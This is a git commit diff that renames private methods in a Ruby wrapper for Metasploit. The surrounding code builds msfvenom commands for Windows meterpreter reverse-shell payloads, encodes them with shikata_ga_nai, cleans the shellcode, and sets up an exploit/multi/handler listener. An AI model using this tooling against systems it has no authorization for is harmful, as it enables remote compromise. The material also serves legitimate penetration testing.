7c022e61633f22d87fffbce25c50504935f1e7e7
b00stfr3ak <goduke44@gmail.com>
2014-10-27 17:40:45 -0700

    New Private methods
    Added an underscore to private methods

--- lib/metasploit.rb
+++ lib/metasploit.rb
@@ -61,11 +61,11 @@ module Msf
     end
 
     def payload_select
-      payload_options.each do |key, opt|
+      _payload_options.each do |key, opt|
         puts "#{key}) #{opt}"
       end
       choice = rgets('Choice: ', '1')
-      payload_options[choice.to_sym]
+      _payload_options[choice.to_sym]
     end
 
     def generate_shellcode(host, port, payload)
@@ -74,11 +74,11 @@ module Msf
       print_info('Generating shellcode')
       cmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
       cmd << "LPORT=#{port} -e x86/shikata_ga_nai "
-      cmd << "--platform #{platform(payload)} -a #{arch(payload)} "
+      cmd << "--platform #{_platform(payload)} -a #{_arch(payload)} "
       cmd << '-f c 2> /dev/null'
       execute  = `#{cmd}`
       print_success('Shellcode Generated')
-      clean_shellcode(execute)
+      _clean_shellcode(execute)
     end
 
     def start(host, port)
@@ -87,7 +87,7 @@ module Msf
       end
       file_path = file_root + '/metaspoit_files/'
       rc_file = 'msf_listener.rc'
-      write_rc(file_path, rc_file, host, port)
+      _write_rc(file_path, rc_file, host, port)
       print_info("Setting up Metasploit this may take a moment\n")
       system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
     end
@@ -102,7 +102,7 @@ module Msf
 
     private
 
-    def clean_shellcode(shellcode)
+    def _clean_shellcode(shellcode)
       shellcode = shellcode.gsub('\\', ',0')
       shellcode = shellcode.delete('+')
       shellcode = shellcode.delete('"')
@@ -113,7 +113,7 @@ module Msf
       shellcode
     end
 
-    def write_rc(file_path, rc_file, host, port)
+    def _write_rc(file_path, rc_file, host, port)
       file = File.open("#{file_path}#{rc_file}", 'w')
       file.write("use exploit/multi/handler\n")
       file.write("set PAYLOAD #{@set_payload}\n")
@@ -125,13 +125,13 @@ module Msf
       file.close
     end
 
-    def payload_options
+    def _payload_options
       { :'1' => 'windows/meterpreter/reverse_tcp',
         :'2' => 'windows/meterpreter/reverse_https',
         :'3' => 'windows/meterpreter/reverse_http' }
     end
 
-    def arch(payload)
+    def _arch(payload)
       case payload
       when /x64/
         'x64'
@@ -140,7 +140,7 @@ module Msf
       end
     end
 
-    def platform(payload)
+    def _platform(payload)
       case payload
       when /windows/
         'windows'
